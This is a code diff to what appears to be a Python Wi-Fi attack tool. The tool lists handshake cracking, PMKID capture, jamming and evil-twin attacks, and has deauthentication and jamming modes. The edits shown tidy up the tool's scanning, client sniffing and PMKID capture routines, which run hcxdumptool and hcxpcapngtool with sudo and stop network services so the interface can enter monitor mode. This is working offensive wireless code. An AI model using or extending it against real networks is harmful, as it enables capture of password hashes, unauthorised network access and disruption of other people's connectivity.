@@ -34,7 +34,7 @@ LOGO = r"""
 
 # | GLOBAL VARIABLES | #
 
-interfering_services = ['NetworkManager', 'wpa_supplicant', 'avahi-daemon']
+interfering_services = ['NetworkManager', 'wpa_supplicant']
 attack_list = ['Handshake Crack', 'PMKID Attack', 'Jamming', 'Evil Twin']
 deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
 jammer_modes = ['Client jamming', 'Broadcast jamming']
@@ -604,7 +604,12 @@ def scan_ap(interface):
           frequency = round(float(frequency_match.group(1).strip())) if frequency_match else None
           auth = auth_match.group(1).strip() if auth_match else None
           cipher = cipher_match.group(1).strip() if cipher_match else None
-          
+
+          # Handle case where ssid isn't properly read, bytes captured instead
+          if ssid:
+               if "\\x00\\x00\\x00\\" in ssid:
+                    ssid = '--- BYTES ---'
+               
           # Map frequency to band (e.g., 2.4 GHz or 5 GHz)
           band = None
           if frequency:
@@ -685,13 +690,11 @@ def sniff_clients(interface, target_ap, target):
                     if pkt.addr2 == target_ap and pkt.addr1 not in clients: 
                          # Check if not one of the standardized MAC addresses
                          if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs): 
-                              #print(f'2 {pkt.addr2} = {target_ap}, | {pkt.addr1} |')
                               clients.append(pkt.addr1)
 
                     elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
                          # Check if not one of the standardized MAC addresses
                          if not any(pkt.addr2.startswith(mac) for mac in standardized_MACs):
-                              #print(f'1 {pkt.addr1} = {target_ap}, | {pkt.addr2} |')
                               clients.append(pkt.addr2)
 
      def sniffing_process(interrupted):
@@ -995,8 +998,7 @@ def pmkid_attack(target_ap, interface, target):
           file_num = output_file.split('-')[1]
      except:
           file_num = None
-     print(output_dir)
-     print(output_file)
+
      # Wait and verify that handshake was captured successfuly
      captured = False
      print(f"{CYAN}[>]{RESET} Waiting for PMKID...")
@@ -1010,7 +1012,6 @@ def pmkid_attack(target_ap, interface, target):
                          command = ['sudo', 'hcxpcapngtool', '-o', f'{output_dir}/pmkid_hash', f'{output_dir}/{output_file}']
                     verify = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                     output = str(verify.communicate())
-                    print(output)
                except:
                     pass
                # Extract the caught PMKID's number value
@@ -1018,13 +1019,12 @@ def pmkid_attack(target_ap, interface, target):
                pmkid_match = re.search(pmkid_pattern, output) # Search for the pattern in the output string
                if pmkid_match:
                     pmkid = pmkid_match.group(1)
-                    print(pmkid)
                     if int(pmkid) > 0:
                          print(f"{CYAN}[>]{RESET} PMKID captured!")
                          captured = True
                          delete_capture = False
 
-          time.sleep(5)
+          time.sleep(4)
           
      # Kill hcxdumptool process
      capture_pmkid.terminate()
@@ -1561,7 +1561,7 @@ else:
                     try:
                          signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                          monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-                         stop_services(None)
+                         stop_services(None) # Make sure interfering services are down
                          time.sleep(2)
                          signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
                     except KeyboardInterrupt:
@@ -1577,7 +1577,7 @@ else:
                try:
                     signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                     monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-                    stop_services(None)
+                    stop_services(None) # Make sure interfering services are down
                     time.sleep(2)
                     signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
                except KeyboardInterrupt:
@@ -1606,7 +1606,7 @@ else:
                     try:
                          signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                          monitor_switch('verbose', 'start', interface, target_ap['Channel']) # Make sure interface is in Monitor with target ap's channel
-                         stop_services(None)
+                         stop_services(None) # Make sure interfering services are down
                          time.sleep(2)
                          signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
                     except KeyboardInterrupt:
@@ -1622,7 +1622,7 @@ else:
                     try:
                          signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
                          monitor_switch('verbose', 'stop', interface, None)
-                         start_services(None)
+                         start_services(None) # Make sure interfering services are up
                          time.sleep(2)
                          signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
                     except:
@@ -1638,6 +1638,7 @@ else:
      if interface:
           try:
                signal.signal(signal.SIGINT, signal.SIG_IGN) # Start - disable ctrl + c for user
+               time.sleep(2)
                monitor_switch('verbose', 'stop', interface, None)
                signal.signal(signal.SIGINT, signal.default_int_handler) # Stop - disable ctrl + c for user 
           except:
